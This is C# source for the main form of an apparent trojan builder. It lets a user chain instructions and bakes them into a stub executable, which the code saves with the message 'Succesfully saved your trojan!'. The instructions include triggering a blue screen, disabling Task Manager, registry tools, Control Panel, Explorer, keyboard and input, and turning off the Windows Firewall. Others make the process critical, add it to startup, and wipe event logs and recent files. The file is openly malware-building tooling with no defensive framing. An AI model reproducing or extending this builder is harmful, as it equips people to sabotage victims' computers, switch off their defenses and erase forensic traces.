using MetroSuite;
using System.Diagnostics;
using System.Windows.Forms;
using System;
using System.Text;
using System.Linq;
using Guna.UI.WinForms;

public partial class MainForm : MetroForm
{
    public MainForm()
    {
        InitializeComponent();
        CheckForIllegalCrossThreadCalls = false;
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        siticoneComboBox1.SelectedIndex = 0;
        siticoneComboBox2.SelectedIndex = 0;
        siticoneComboBox3.SelectedIndex = 0;
        siticoneComboBox5.SelectedIndex = 0;
    }

    private void gunaButton3_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count > 0)
        {
            if (MessageBox.Show("Are you sure you want to delete all instructions?", Text, MessageBoxButtons.YesNo, MessageBoxIcon.Question).Equals(DialogResult.Yes))
            {
                listBox1.Items.Clear();
                Utils.instructions.Clear();
            }
        }
    }

    private void gunaButton4_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count > 0 && listBox1.SelectedIndices.Count > 0)
        {
            if (MessageBox.Show("Are you sure you want to delete the selected instructions?", Text, MessageBoxButtons.YesNo, MessageBoxIcon.Question).Equals(DialogResult.Yes))
            {
                while (listBox1.SelectedIndices.Count > 0)
                {
                    int theIndex = int.Parse(listBox1.SelectedIndices[0].ToString());
                    listBox1.Items.RemoveAt(theIndex);
                    Utils.instructions.RemoveAt(theIndex);
                }
            }
        }
    }

    private void gunaButton6_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count > 0)
        {
            if (listBox1.SelectedItem != null)
            {
                if (listBox1.SelectedItems.Count == 1)
                {
                    TrojanInstruction instruction = Utils.instructions[listBox1.SelectedIndex];
                    GetDetails details = new GetDetails();

                    foreach (Control control in details.Controls)
                    {
                        if (control.Name.Equals("gunaLineTextBox1"))
                        {
                            GunaLineTextBox textBox = (GunaLineTextBox)control;
                            textBox.Text = instruction.Name;
                        }
                        else if (control.Name.Equals("gunaTextBox1"))
                        {
                            GunaTextBox textBox = (GunaTextBox)control;
                            textBox.Text = instruction.Details;
                        }
                    }

                    details.Show();
                }
            }
        }
    }

    private void gunaButton5_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count > 0)
        {
            if (listBox1.SelectedItem != null)
            {
                if (listBox1.SelectedItems.Count == 1)
                {
                    TrojanInstruction instruction = Utils.instructions[listBox1.SelectedIndex];
                    SetDetails details = new SetDetails();

                    foreach (Control control in details.Controls)
                    {
                        if (control.Name.Equals("gunaLineTextBox1"))
                        {
                            GunaLineTextBox textBox = (GunaLineTextBox)control;
                            textBox.Text = instruction.Name;
                        }
                        else if (control.Name.Equals("gunaTextBox1"))
                        {
                            GunaTextBox textBox = (GunaTextBox)control;
                            textBox.Text = instruction.Details;
                        }
                        else if (control.Name.Equals("label1"))
                        {
                            Label label = (Label)control;
                            label.Text = listBox1.SelectedIndex.ToString();
                        }
                    }

                    details.Show();
                }
            }
        }
    }

    private void gunaButton2_Click(object sender, EventArgs e)
    {
        try
        {
            openFileDialog1.FileName = "";

            if (openFileDialog1.ShowDialog().Equals(DialogResult.OK))
            {
                string readFile = System.IO.File.ReadAllText(openFileDialog1.FileName);

                if (readFile.Contains("|"))
                {
                    foreach (string splitted in readFile.Split('|'))
                    {
                        byte[] obtained = Convert.FromBase64String(splitted);
                        int nameLength = BitConverter.ToInt32(obtained.Take(4).ToArray(), 0);
                        obtained = obtained.Skip(4).ToArray();
                        string name = Encoding.UTF8.GetString(obtained.Take(nameLength).ToArray());
                        obtained = obtained.Skip(nameLength).ToArray();
                        string details = Encoding.UTF8.GetString(obtained);

                        TrojanInstruction instruction = new TrojanInstruction()
                        {
                            Name = name,
                            Details = details
                        };

                        Utils.instructions.Add(instruction);
                    }
                }
                else
                {
                    byte[] obtained = Convert.FromBase64String(readFile);
                    int nameLength = BitConverter.ToInt32(obtained.Take(4).ToArray(), 0);
                    obtained = obtained.Skip(4).ToArray();
                    string name = Encoding.UTF8.GetString(obtained.Take(nameLength).ToArray());
                    obtained = obtained.Skip(nameLength).ToArray();
                    string details = Encoding.UTF8.GetString(obtained);

                    TrojanInstruction instruction = new TrojanInstruction()
                    {
                        Name = name,
                        Details = details
                    };

                    Utils.instructions.Add(instruction);
                }

                listBox1.Items.Clear();

                foreach (TrojanInstruction instruction in Utils.instructions)
                {
                    listBox1.Items.Add(instruction.Name);
                }

                MessageBox.Show("Succesfully imported the project!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        catch
        {
            MessageBox.Show("Could not read the project file due to an expected error.", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void gunaButton1_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count == 0)
        {
            return;
        }

        saveFileDialog1.FileName = "";

        if (saveFileDialog1.ShowDialog().Equals(DialogResult.OK))
        {
            string totalFile = "";

            foreach (TrojanInstruction instr in Utils.instructions)
            {
                byte[] nameBytes = Encoding.UTF8.GetBytes(instr.Name);
                byte[] newBytes = BitConverter.GetBytes(nameBytes.Length);
                newBytes = Combine(newBytes, nameBytes);
                newBytes = Combine(newBytes, Encoding.UTF8.GetBytes(instr.Details));

                if (totalFile == "")
                {
                    totalFile = Convert.ToBase64String(newBytes);
                }
                else
                {
                    totalFile += "|" + Convert.ToBase64String(newBytes);
                }
            }

            System.IO.File.WriteAllText(saveFileDialog1.FileName, totalFile);
            MessageBox.Show("Succesfully saved your project!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }

    public static byte[] Combine(byte[] first, byte[] second)
    {
        byte[] ret = new byte[first.Length + second.Length];

        Buffer.BlockCopy(first, 0, ret, 0, first.Length);
        Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);

        return ret;
    }

    private void listBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode.Equals(Keys.Back) || e.KeyCode.Equals(Keys.Cancel))
        {
            gunaButton4.PerformClick();
        }
    }

    private void gunaButton7_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "MessageBox",
            Details =
            "[Title] = \"" + Utils.AdjustEscapes(gunaLineTextBox1.Text) + "\"\r\n" +
            "[Content] = \"" + Utils.AdjustEscapes(gunaTextBox1.Text) + "\"\r\n" +
            "[Icon] = \"" + siticoneComboBox2.SelectedItem.ToString() + "\"\r\n" +
            "[Buttons] = \"" + siticoneComboBox1.SelectedItem.ToString() + "\""
        });
        RefreshListBox();
    }

    public void RefreshListBox()
    {
        listBox1.Items.Add(Utils.instructions[Utils.instructions.Count - 1].Name);
    }

    private void gunaButton8_Click(object sender, EventArgs e)
    {
        if (listBox1.Items.Count == 0)
        {
            return;
        }

        try
        {
            saveFileDialog2.FileName = "";

            if (saveFileDialog2.ShowDialog().Equals(DialogResult.OK))
            {
                byte[] currentBytes = System.IO.File.ReadAllBytes(@"C:\Users\gabry\Desktop\Computer\Developing\Progetti\GabryB03 GitHub\Repositories\TrojanCreator\Stub\bin\Release\Stub.exe");
                currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes("|TROJAN_CREATOR_SPLITTED|"));
                bool initialized = false;

                foreach (TrojanInstruction instr in Utils.instructions)
                {
                    string name = instr.Name, details = instr.Details;
                    InstructionDetails theDetails = new InstructionDetails(details);
                    int operationType = 0;
                    byte[] newBytes = null;

                    if (name == "MessageBox")
                    {
                        operationType = 1;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Title", "Content", "Icon", "Buttons" }));
                    }
                    else if (name == "BSOD")
                    {
                        operationType = 2;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Method" }));
                    }
                    else if (name == "TimeSleep")
                    {
                        operationType = 3;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Milliseconds" }));
                    }
                    else if (name == "Task Bar")
                    {
                        operationType = 4;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Desktop")
                    {
                        operationType = 5;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Desktop Icons")
                    {
                        operationType = 6;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Monitor")
                    {
                        operationType = 7;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Critical Process")
                    {
                        operationType = 8;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Administrator Permissions")
                    {
                        operationType = 9;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Computer Boot")
                    {
                        operationType = 10;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Task Manager")
                    {
                        operationType = 11;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Registry Tools")
                    {
                        operationType = 12;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Control Panel")
                    {
                        operationType = 13;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Thread Termination")
                    {
                        operationType = 14;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "System Startup")
                    {
                        operationType = 15;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Jumpscare")
                    {
                        operationType = 16;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Type", "Milliseconds", "ExecuteOther" }));
                    }
                    else if (name == "Computer inputs")
                    {
                        operationType = 17;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti See File")
                    {
                        operationType = 18;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Explorer")
                    {
                        operationType = 19;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Keyboard")
                    {
                        operationType = 20;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Progressive Runtime")
                    {
                        operationType = 21;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Swap Mouse Buttons")
                    {
                        operationType = 22;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Windows Firewall")
                    {
                        operationType = 23;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Windows Event Logs")
                    {
                        operationType = 24;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }
                    else if (name == "Anti Windows Recent Files")
                    {
                        operationType = 25;
                        newBytes = BitConverter.GetBytes(operationType);
                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                    }

                    if (newBytes != null)
                    {
                        if (!initialized)
                        {
                            initialized = true;
                            currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes(Convert.ToBase64String(newBytes)));
                        }
                        else
                        {
                            currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes("|"));
                            currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes(Convert.ToBase64String(newBytes)));
                        }
                    }
                }

                System.IO.File.WriteAllBytes(saveFileDialog2.FileName, currentBytes);
                MessageBox.Show("Succesfully saved your trojan!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        catch
        {
            MessageBox.Show("Could not read save the trojan due to an unexpected error.", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    public byte[] FillProperties(InstructionDetails details, string[] names)
    {
        byte[] newBytes = null;

        foreach (string name in names)
        {
            if (newBytes == null)
            {
                byte[] str = Encoding.UTF8.GetBytes(details.GetProperty(name));
                newBytes = BitConverter.GetBytes(str.Length);
                newBytes = Combine(newBytes, str);
            }
            else
            {
                byte[] str = Encoding.UTF8.GetBytes(details.GetProperty(name));
                newBytes = Combine(newBytes, BitConverter.GetBytes(str.Length));
                newBytes = Combine(newBytes, str);
            }
        }

        return newBytes;
    }

    private void gunaButton9_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "BSOD",
            Details =
                "[Method] = \"" + siticoneComboBox3.SelectedItem.ToString() + "\""
        });
        RefreshListBox();
    }

    private void gunaButton10_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "TimeSleep",
            Details =
                "[Milliseconds] = \"" + gunaLineTextBox2.Text + "\""
        });
        RefreshListBox();
    }

    private void gunaButton12_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Task Bar",
            Details =
                "[Action] = \"Hide\""
        });
        RefreshListBox();
    }

    private void gunaButton11_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Task Bar",
            Details =
                "[Action] = \"Show\""
        });
        RefreshListBox();
    }

    private void gunaButton13_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Desktop",
            Details =
                "[Action] = \"Hide\""
        });
        RefreshListBox();
    }

    private void gunaButton14_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Desktop",
            Details =
                "[Action] = \"Show\""
        });
        RefreshListBox();
    }

    private void gunaButton15_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Desktop Icons",
            Details =
                "[Action] = \"Hide\""
        });
        RefreshListBox();
    }

    private void gunaButton16_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Desktop Icons",
            Details =
                "[Action] = \"Show\""
        });
        RefreshListBox();
    }

    private void gunaButton17_Click_1(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Monitor",
            Details =
                "[Action] = \"Disable\""
        });
        RefreshListBox();
    }

    private void gunaButton18_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Monitor",
            Details =
                "[Action] = \"Enable\""
        });
        RefreshListBox();
    }

    private void gunaButton19_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Critical Process",
            Details =
                "[Action] = \"Enable\""
        });
        RefreshListBox();
    }

    private void gunaButton20_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Critical Process",
            Details =
                "[Action] = \"Disable\""
        });
        RefreshListBox();
    }

    private void gunaButton21_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Administrator Permissions",
            Details =
                "[Action] = \"ReRun\""
        });
        RefreshListBox();
    }

    private void gunaButton23_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Computer Boot",
            Details =
                "[Action] = \"Shutdown\""
        });
        RefreshListBox();
    }

    private void gunaButton24_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Computer Boot",
            Details =
                "[Action] = \"Restart\""
        });
        RefreshListBox();
    }

    private void gunaButton22_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Task Manager",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton25_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Task Manager",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton26_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Registry Tools",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton27_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Registry Tools",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton29_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Control Panel",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton28_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Control Panel",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton31_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Thread Termination",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton30_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Thread Termination",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton33_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "System Startup",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton32_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Jumpscare",
            Details =
                "[Type] = \"" + siticoneComboBox5.SelectedItem.ToString() + "\"\r\n" +
                "[Milliseconds] = \"" + (siticoneCheckBox2.Checked ? "UNLIMITED_TIME" : gunaLineTextBox3.Text) + "\"\r\n" +
                "[ExecuteOther] = \"" + siticoneCheckBox1.Checked.ToString() + "\""
        });
        RefreshListBox();
    }

    private void gunaButton35_Click(object sender, EventArgs e)
    {
        try
        {
            int selectedIndex = listBox1.SelectedIndex;
            int otherIndex = listBox1.SelectedIndex - 1;

            string selectedItem = listBox1.Items[selectedIndex].ToString();
            string otherItem = listBox1.Items[otherIndex].ToString();

            TrojanInstruction selectedInstruction = Utils.instructions[selectedIndex];
            TrojanInstruction otherInstruction = Utils.instructions[otherIndex];

            listBox1.Items.RemoveAt(otherIndex);
            listBox1.Items.Insert(selectedIndex, otherItem);

            Utils.instructions.RemoveAt(otherIndex);
            Utils.instructions.Insert(selectedIndex, otherInstruction);
        }
        catch
        {

        }
    }

    private void gunaButton34_Click(object sender, EventArgs e)
    {
        try
        {
            int selectedIndex = listBox1.SelectedIndex;
            int otherIndex = listBox1.SelectedIndex + 1;

            string selectedItem = listBox1.Items[selectedIndex].ToString();
            string otherItem = listBox1.Items[otherIndex].ToString();

            TrojanInstruction selectedInstruction = Utils.instructions[selectedIndex];
            TrojanInstruction otherInstruction = Utils.instructions[otherIndex];

            listBox1.Items.RemoveAt(otherIndex);
            listBox1.Items.Insert(selectedIndex, otherItem);

            Utils.instructions.RemoveAt(otherIndex);
            Utils.instructions.Insert(selectedIndex, otherInstruction);
        }
        catch
        {

        }
    }

    private void gunaButton36_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Computer inputs",
            Details =
                "[Action] = \"Disable\""
        });
        RefreshListBox();
    }

    private void gunaButton37_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Computer inputs",
            Details =
                "[Action] = \"Enable\""
        });
        RefreshListBox();
    }

    private void gunaButton39_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti See File",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton38_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti See File",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton41_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Explorer",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton40_Click_1(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Explorer",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton42_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Keyboard",
            Details =
                "[Action] = \"Disable\""
        });
        RefreshListBox();
    }

    private void gunaButton43_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Keyboard",
            Details =
                "[Action] = \"Enable\""
        });
        RefreshListBox();
    }

    private void gunaButton45_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Progressive Runtime",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton44_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Swap Mouse Buttons",
            Details =
                "[Action] = \"Swap\""
        });
        RefreshListBox();
    }

    private void gunaButton46_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Swap Mouse Buttons",
            Details =
                "[Action] = \"Unswap\""
        });
        RefreshListBox();
    }

    private void gunaButton47_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Windows Firewall",
            Details =
                "[Action] = \"Disable\""
        });
        RefreshListBox();
    }

    private void gunaButton48_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Windows Firewall",
            Details =
                "[Action] = \"Enable\""
        });
        RefreshListBox();
    }

    private void gunaButton50_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Windows Event Logs",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton49_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Windows Event Logs",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }

    private void gunaButton52_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Windows Recent Files",
            Details =
                "[Action] = \"Start\""
        });
        RefreshListBox();
    }

    private void gunaButton51_Click(object sender, EventArgs e)
    {
        Utils.instructions.Add(new TrojanInstruction()
        {
            Name = "Anti Windows Recent Files",
            Details =
                "[Action] = \"Stop\""
        });
        RefreshListBox();
    }
}